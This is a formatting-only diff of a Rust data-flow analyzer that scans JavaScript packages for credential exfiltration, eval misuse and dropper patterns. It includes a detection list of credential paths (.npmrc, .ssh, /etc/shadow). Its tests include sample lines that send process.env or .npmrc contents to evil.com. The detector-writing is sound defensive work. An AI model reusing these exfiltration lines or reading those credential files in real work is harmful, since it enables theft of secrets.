@@ -112,12 +112,7 @@ impl Analyzer for DataFlowAnalyzer {
 // ---------------------------------------------------------------------------
 
 /// Analyze a scope (program or function body) for taint flows.
-fn analyze_scope(
-    scope_node: Node,
-    source: &str,
-    file: &str,
-    findings: &mut Vec<Finding>,
-) {
+fn analyze_scope(scope_node: Node, source: &str, file: &str, findings: &mut Vec<Finding>) {
     let mut state = TaintState::default();
 
     // Walk top-level children (statements) in order.
@@ -134,17 +129,14 @@ fn analyze_scope(
 
 /// Recurse into function declarations / arrow functions / function expressions
 /// and analyze each body as its own scope.
-fn visit_functions(
-    node: Node,
-    source: &str,
-    file: &str,
-    findings: &mut Vec<Finding>,
-) {
+fn visit_functions(node: Node, source: &str, file: &str, findings: &mut Vec<Finding>) {
     let count = node.child_count();
     for i in 0..count {
         if let Some(child) = node.child(i) {
             match child.kind() {
-                "function_declaration" | "arrow_function" | "function_expression"
+                "function_declaration"
+                | "arrow_function"
+                | "function_expression"
                 | "method_definition" => {
                     if let Some(body) = child.child_by_field_name("body") {
                         analyze_scope(body, source, file, findings);
@@ -184,7 +176,8 @@ fn process_statement(
             process_variable_decl(node, source, file, state, findings);
         }
         "expression_statement" => {
-            if let Some(expr) = node.child_by_field_name("expression")
+            if let Some(expr) = node
+                .child_by_field_name("expression")
                 .or_else(|| node.child(0))
             {
                 check_sinks(expr, source, file, state, findings);
@@ -360,8 +353,16 @@ fn classify_source(node: Node, source: &str) -> Option<TaintKind> {
 /// Check whether a readFileSync/readFile call text targets a sensitive path.
 fn is_sensitive_read(text: &str) -> bool {
     let sensitive = [
-        ".npmrc", ".ssh", ".aws", ".env", ".netrc", ".git/config",
-        "/etc/passwd", "/etc/shadow", "credentials", ".gnupg",
+        ".npmrc",
+        ".ssh",
+        ".aws",
+        ".env",
+        ".netrc",
+        ".git/config",
+        "/etc/passwd",
+        "/etc/shadow",
+        "credentials",
+        ".gnupg",
     ];
     sensitive.iter().any(|s| text.contains(s))
 }
@@ -443,8 +444,7 @@ fn check_sinks(
                         findings.push(Finding {
                             severity: Severity::Critical,
                             category: FindingCategory::DataFlow,
-                            title: "Data exfiltration: process.env sent over network"
-                                .to_string(),
+                            title: "Data exfiltration: process.env sent over network".to_string(),
                             description:
                                 "Environment variables are read, then sent via a network call \
                                  — classic credential exfiltration pattern"
@@ -458,12 +458,10 @@ fn check_sinks(
                         findings.push(Finding {
                             severity: Severity::Critical,
                             category: FindingCategory::DataFlow,
-                            title: "Credential theft: sensitive file sent over network"
-                                .to_string(),
-                            description:
-                                "A sensitive file (e.g. .npmrc, .ssh) is read and then \
+                            title: "Credential theft: sensitive file sent over network".to_string(),
+                            description: "A sensitive file (e.g. .npmrc, .ssh) is read and then \
                                  transmitted over the network"
-                                    .to_string(),
+                                .to_string(),
                             file: Some(file.to_string()),
                             line: Some(line_number(node)),
                             snippet: Some(snippet_for(node, source)),
@@ -473,16 +471,16 @@ fn check_sinks(
                 }
             }
             // Also check the full call text (URL might contain tainted var).
-            else if let Some(TaintKind::EnvData | TaintKind::Credentials) = find_taint_in_text(text, state) {
+            else if let Some(TaintKind::EnvData | TaintKind::Credentials) =
+                find_taint_in_text(text, state)
+            {
                 findings.push(Finding {
                     severity: Severity::Critical,
                     category: FindingCategory::DataFlow,
-                    title: "Data exfiltration: tainted data in network URL"
-                        .to_string(),
-                    description:
-                        "Tainted data (env vars or credentials) appears in a network \
+                    title: "Data exfiltration: tainted data in network URL".to_string(),
+                    description: "Tainted data (env vars or credentials) appears in a network \
                          call URL or body"
-                            .to_string(),
+                        .to_string(),
                     file: Some(file.to_string()),
                     line: Some(line_number(node)),
                     snippet: Some(snippet_for(node, source)),
@@ -498,10 +496,9 @@ fn check_sinks(
                 severity: Severity::Critical,
                 category: FindingCategory::DataFlow,
                 title: "Tainted data passed to eval/Function".to_string(),
-                description:
-                    "Data from an untrusted source flows into eval() or Function() \
+                description: "Data from an untrusted source flows into eval() or Function() \
                      — remote code execution risk"
-                        .to_string(),
+                    .to_string(),
                 file: Some(file.to_string()),
                 line: Some(line_number(node)),
                 snippet: Some(snippet_for(node, source)),
@@ -538,10 +535,9 @@ fn check_sinks(
                     severity: Severity::High,
                     category: FindingCategory::DataFlow,
                     title: "Dropper: network data written to file".to_string(),
-                    description:
-                        "Data fetched from the network is written to a local file — \
+                    description: "Data fetched from the network is written to a local file — \
                          potential dropper (download + write + execute)"
-                            .to_string(),
+                        .to_string(),
                     file: Some(file.to_string()),
                     line: Some(line_number(node)),
                     snippet: Some(snippet_for(node, source)),
@@ -560,10 +556,9 @@ fn check_sinks(
                     severity: Severity::High,
                     category: FindingCategory::DataFlow,
                     title: "Credential data used near network context".to_string(),
-                    description:
-                        "A variable containing sensitive file data appears in the same \
+                    description: "A variable containing sensitive file data appears in the same \
                          statement as a network call"
-                            .to_string(),
+                        .to_string(),
                     file: Some(file.to_string()),
                     line: Some(line_number(node)),
                     snippet: Some(snippet_for(node, source)),
@@ -648,8 +643,8 @@ fn snippet_for(node: Node, source: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use std::path::{Path, PathBuf};
     use crate::registry::package::PackageMetadata;
+    use std::path::{Path, PathBuf};
 
     fn default_metadata() -> PackageMetadata {
         PackageMetadata {
@@ -751,10 +746,7 @@ fetch('https://evil.com/steal?d=' + npmrc);
         let findings = analyze_js(code);
         let cred: Vec<_> = findings
             .iter()
-            .filter(|f| {
-                f.category == FindingCategory::DataFlow
-                    && f.title.contains("Credential")
-            })
+            .filter(|f| f.category == FindingCategory::DataFlow && f.title.contains("Credential"))
             .collect();
         assert!(
             !cred.is_empty(),
@@ -777,8 +769,7 @@ exec(payload);
         let exec_findings: Vec<_> = findings
             .iter()
             .filter(|f| {
-                f.category == FindingCategory::DataFlow
-                    && f.title.contains("child_process")
+                f.category == FindingCategory::DataFlow && f.title.contains("child_process")
             })
             .collect();
         assert!(
@@ -797,9 +788,7 @@ eval(code);
         let findings = analyze_js(code);
         let eval_findings: Vec<_> = findings
             .iter()
-            .filter(|f| {
-                f.category == FindingCategory::DataFlow && f.title.contains("eval")
-            })
+            .filter(|f| f.category == FindingCategory::DataFlow && f.title.contains("eval"))
             .collect();
         assert!(
             !eval_findings.is_empty(),
@@ -828,13 +817,19 @@ console.log(data);
 
     #[test]
     fn skips_non_js_files() {
-        let findings = analyze_file("script.ts", "const d = process.env; fetch('http://evil.com/' + d);");
+        let findings = analyze_file(
+            "script.ts",
+            "const d = process.env; fetch('http://evil.com/' + d);",
+        );
         assert!(findings.is_empty(), "should skip .ts files");
     }
 
     #[test]
     fn skips_dist_directory() {
-        let findings = analyze_file("dist/index.js", "const d = process.env; fetch('http://evil.com/' + d);");
+        let findings = analyze_file(
+            "dist/index.js",
+            "const d = process.env; fetch('http://evil.com/' + d);",
+        );
         assert!(findings.is_empty(), "should skip dist/ files");
     }
 
@@ -867,9 +862,7 @@ fs.writeFileSync('/tmp/p', data);
         let findings = analyze_js(code);
         let dropper: Vec<_> = findings
             .iter()
-            .filter(|f| {
-                f.category == FindingCategory::DataFlow && f.title.contains("Dropper")
-            })
+            .filter(|f| f.category == FindingCategory::DataFlow && f.title.contains("Dropper"))
             .collect();
         assert!(
             !dropper.is_empty(),
